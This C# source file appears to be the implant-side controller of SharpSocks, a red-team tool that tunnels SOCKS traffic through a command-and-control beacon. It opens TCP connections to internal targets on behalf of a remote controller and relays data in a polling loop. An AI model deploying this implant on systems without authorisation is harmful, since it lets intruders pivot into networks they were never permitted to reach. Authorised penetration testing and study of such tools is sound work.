using Common.Classes.Encryption;
using ImplantSide.Classes.Comms;
using ImplantSide.Classes.ErrorHandler;
using ImplantSide.Classes.Target;
using ImplantSide.Interfaces;
using SharpSocksImplant.Classes.Socks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace SocksProxy.Classes.Socks
{
	public class SocksLoopController
	{
		internal Dictionary<String, TargetInfo> _targets = new Dictionary<String, TargetInfo>();
		public InternalErrorHandler ErrorHandler { get; set; }
		public IImplantLog ImplantComms { get; set; }
		public IEncryptionHelper Encryption { get; set; }
		public CommandCommunicationHandler CmdCommshandler { get; set; }
		public AutoResetEvent Timeout = new AutoResetEvent(false);
		public Int16 BeaconTime { get; set; }
		public Dictionary<String, Int16> _mapTargetToCount = new Dictionary<String, Int16>();
		static SocksSocketComms socketComms;
		static List<Task> _socketCommsTasks = new List<Task>();

		public SocksLoopController(IImplantLog icomms, CommandCommunicationHandler comms, Int16 beaconTime)
		{
			ImplantComms = icomms;
			CmdCommshandler = comms;
			BeaconTime = beaconTime;
			socketComms = new SocksSocketComms() { ImplantComms = ImplantComms, CmdCommshandler = comms, BeaconTime = beaconTime};
			_socketCommsTasks.Add(Task.Factory.StartNew(() => socketComms.WriteToSocket(), TaskCreationOptions.LongRunning));
			_socketCommsTasks.Add(Task.Factory.StartNew(() => socketComms.ReadFromSocket(), TaskCreationOptions.LongRunning));
			_socketCommsTasks.Add(Task.Factory.StartNew(() => socketComms.SendToTarget(), TaskCreationOptions.LongRunning));
		}
		
		public bool OpenNewConnectionToTarget(String targetId, String targetHost, ushort targetPort)
        {
			var target = new TargetInfo() { TargetId = targetId, TargetPort = targetPort, TargetHost = targetHost };
			System.Net.Sockets.AddressFamily AF_TYPE = System.Net.Sockets.AddressFamily.InterNetwork;
            //Step 1. Open connection to target
            IPAddress targetIP = null;
            try
            {
                var hostNameType = Uri.CheckHostName(targetHost);
                switch (hostNameType)
                {
                    case UriHostNameType.Dns:
                        var iph = Dns.GetHostEntry(targetHost);
                        if (null != iph && null != iph.AddressList)
                        {
                            var firstIP = iph.AddressList.First();
                            if (null != firstIP && !String.IsNullOrWhiteSpace(firstIP.ToString()))
                                targetIP = firstIP;
                            else
                            {
                                ErrorHandler.LogError($"Unable to resolve the host {targetHost}");
                                return false;
                            }
                            if (Uri.CheckHostName(targetIP.ToString()) == UriHostNameType.IPv6)
                                AF_TYPE = System.Net.Sockets.AddressFamily.InterNetworkV6;
                        }   
                        break;
                    case UriHostNameType.IPv6:
                    case UriHostNameType.IPv4:
                        targetIP = IPAddress.Parse(targetHost);
                        break; 
                    default:
                        ErrorHandler.LogError($"Unable to resolve the host {targetHost}");
                        return false;
                }

                if (Uri.CheckHostName(targetIP.ToString()) == UriHostNameType.IPv6)
                    AF_TYPE = System.Net.Sockets.AddressFamily.InterNetworkV6; ;

				target.TargetTcpClient = new System.Net.Sockets.TcpClient(AF_TYPE);
                target.TargetTcpClient.Connect(new System.Net.IPEndPoint(targetIP, targetPort));
				if (!target.TargetTcpClient.Connected)
					return false;

			}
            catch (Exception ex)
            {
                var lst = new List<String>
                {
                    "Failed to create connection to " + targetIP.ToString() + " on port " + targetPort.ToString(),
                    ex.Message
                };
                ErrorHandler.LogError(lst);
                return false;
            }

            //Step 2. Start Proxy Loop
            target.ProxyLoop = new Task((g) =>
            {
                try
                {
                    ProxyLoop((String)g);
                }
                catch (Exception ex)
                {
                    ErrorHandler.LogError($"Error in proxy loop: {ex.Message}");

                    if (null != target && null != target.TargetTcpClient)
                        if (target.TargetTcpClient.Connected)
                            target.TargetTcpClient.Close();
                }
            }, targetId, TaskCreationOptions.LongRunning);

            _targets.Add(targetId, target);
			socketComms.AddTarget(targetId, target);
			target.ProxyLoop.Start();
            return true;
        }

        bool ProxyLoop(String targetId)
        {
            List<byte> toSend = null;
            bool connectionHasFailed = false, connectionDead = false;
			TargetInfo target = null;
			_mapTargetToCount.Add(targetId, 1);
			var wait = new ManualResetEvent(false);
			try
            {
                target = _targets[targetId];
                if (null == target)
                {
                    ErrorHandler.LogError("Can't find target for GUID: " + targetId.ToString() + " exiting this proxy loop");
                    return true;
                }
				
				while (!target.Exit)
                {
					toSend = CmdCommshandler.Send(target, "nochange", null, out connectionDead);
					if (null == toSend || connectionDead) 
                    {
						ErrorHandler.LogError($"[{target.TargetId}] Connection looks dead EXITING");
						return target.Exit = connectionDead;
                    }
					else if (toSend.Count > 0 )
					{
						target.WriteQueue.Enqueue(toSend);
						socketComms.SentData.Set();
						_mapTargetToCount[targetId] = 1;
					}
					else
						if (_mapTargetToCount[targetId]++ == 2)
							ImplantComms.LogMessage($"[{target.TargetId}] Nothing received after sending request");
						else 
							ImplantComms.LogMessage($"[{target.TargetId}] Nothing received after sending request({_mapTargetToCount[targetId]})");
					wait.WaitOne(BeaconTime);
				}
				return true;
            }
            catch(Exception ex)
            {
                ErrorHandler.LogError($"[{target.TargetId}] ERROR: {target.TargetTcpClient.Client.RemoteEndPoint.ToString()} {ex.Message}");
                if (null != target && null != target.TargetTcpClient)
                    if (target.TargetTcpClient.Connected)
                        target.TargetTcpClient.Close();
                else
                        ErrorHandler.LogError($"[{target.TargetId}] Target is null {target == null} & target.TargetTcpClient is null {target.TargetTcpClient == null} ");
            }
            finally
            {
                if (null != target && null != target.TargetTcpClient)
                    if (target.TargetTcpClient.Connected)
                        target.TargetTcpClient.Close();

                if (!connectionHasFailed)
                    CmdCommshandler.Send(target, "closed", null, out connectionDead);
            }
			target.Exit = true;
			return true;
        }

        public void StopAll()
        {
            ImplantComms.LogMessage($"Shutdown all connections triggered");
            _targets.Keys.ToList().ForEach(x => {
                Stop(x);
            });
        }

        public void Stop(String targetId)
        {
            var target = _targets[targetId];
            ImplantComms.LogMessage($"Closing connection to {target.TargetHost}:{target.TargetPort}");
            if (null != target)
            {
                target.Exit = true;
            }
        }

        public void HARDStopAll()
        {
            ImplantComms.LogMessage($"HARD STOP ALL TRIGGERED");
            _targets.Keys.ToList().ForEach(x => {
                HARDStop(x);
            });
        }

        public bool HARDStop(String targetId)
        {
            var target = _targets[targetId];
            ImplantComms.LogMessage($"HARD STOP ALL ON CONNECTION TO {target.TargetHost}:{target.TargetPort}");
            if (null != target)
            {
                target.Exit = true;
                target.TargetTcpClient.Close();
                return true;
            }
            else
                return false;
        }
    }
}
